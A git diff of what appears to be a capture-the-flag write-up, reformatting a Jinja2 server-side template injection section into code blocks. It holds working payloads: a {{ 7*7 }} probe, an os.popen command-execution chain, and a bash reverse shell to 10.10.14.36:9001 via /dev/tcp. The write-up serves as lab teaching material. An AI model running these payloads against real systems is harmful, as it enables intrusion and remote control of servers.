@@ -85,16 +85,30 @@ Yup I was logged in.  A great example of why you should not re-use passwords. I 
 [<img src="../images/good_games/ssti_success.png"
   style="width: 800px;"/>](../images/good_games/ssti_success.png)
 
-As you can see after entering the payload `{{ 7*7 }}` for full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource.  Within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
+As you can see after entering the payload 
 
-I used the payload `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}` and entered a date of birth and phone number and hit save. 
+```bash
+{{ 7*7 }}
+``` 
+For the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource.  Within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
+
+I used the payload 
+
+```bash
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+``` 
+and entered a date of birth and phone number and hit save. 
 
 [<img src="../images/good_games/ssti_id.png"
   style="width: 800px;"/>](../images/good_games/ssti_id.png)
 
 As you can see from the username on the right of the page it is showing we have code execution and we actually have it as the root user. 
 
-So now it was time to leverage this code execution to get a reverse shell on the server.  With the payload `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"').read() }}`
+So now it was time to leverage this code execution to get a reverse shell on the server.  With the payload 
+
+```bash
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"').read() }}
+```
 
 [<img src="../images/good_games/rev_shell.png"
   style="width: 800px;"/>](../images/good_games/rev_shell.png)
